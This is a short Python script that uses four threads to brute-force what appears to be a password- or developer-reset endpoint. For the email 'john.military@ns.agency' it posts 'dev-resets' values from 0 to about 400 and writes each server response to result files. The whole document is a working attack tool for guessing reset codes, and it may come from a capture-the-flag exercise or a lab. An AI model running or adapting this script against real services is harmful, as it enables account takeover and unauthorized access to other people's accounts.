#!/usr/bin/python3 

import sys, re, os
import threading 
import time 
import requests 

url = sys.argv[1]

class myThread(threading.Thread):
	def __init__(self, threadID, num1, num2, file):
		threading.Thread.__init__(self)
		self.threadID = threadID
		self.num1 = num1
		self.num2 = num2
		self.file = file 
	def run(self):
		print("Starting " + str(self.threadID))
		brute_force(self.num1, self.num2, self.file)

def brute_force(num1, num2, file):
	
	print("**** starting ****")
	for number in range(num1, num2):
		r = requests.post(url, data={'dev-email':'john.military@ns.agency', 'dev-resets':number})
		try: 
			f = open(file, 'a+')
		except: 
			print("ERROR: cannot open file")
		f.write("**** Data for " + str(number) + " ****")
		f.write(r.text[73:])

		



if __name__ == "__main__":
	#testing with numbers set manually 
	thread1 = myThread(1, 0, 100, 'results.txt')
	thread2 = myThread(2, 101, 201, 'results1.txt')
	thread3 = myThread(3, 201, 300, 'results2.txt')
	thread4 = myThread(4, 301, 400, 'results3.txt')

	thread1.start()
	thread2.start()
	thread3.start()
	thread4.start()

	thread1.join()
	thread2.join()
	thread3.join()
	thread4.join()

	print("Exiting Main Thread")